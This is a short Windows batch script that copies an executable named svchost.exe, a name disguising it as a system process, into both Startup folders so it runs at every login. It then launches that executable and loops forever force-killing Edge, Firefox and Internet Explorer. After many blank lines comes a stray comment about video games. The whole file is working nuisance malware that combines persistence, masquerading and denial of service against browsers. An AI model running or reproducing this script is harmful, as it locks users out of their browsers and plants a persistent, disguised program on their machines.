echo f|xcopy /f ".\svchost.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 

start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"

echo f|xcopy ".\svchost.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 



:edges
taskkill /im MicrosoftEdge.exe /f
taskkill /im MicrosoftEdgeCP.exe /f
taskkill /im firefox.exe /f
taskkill /im iexplore.exe /f


goto edges









REM  in reality being good in video games like dota/lol doesnt make you any better than a game developer ,
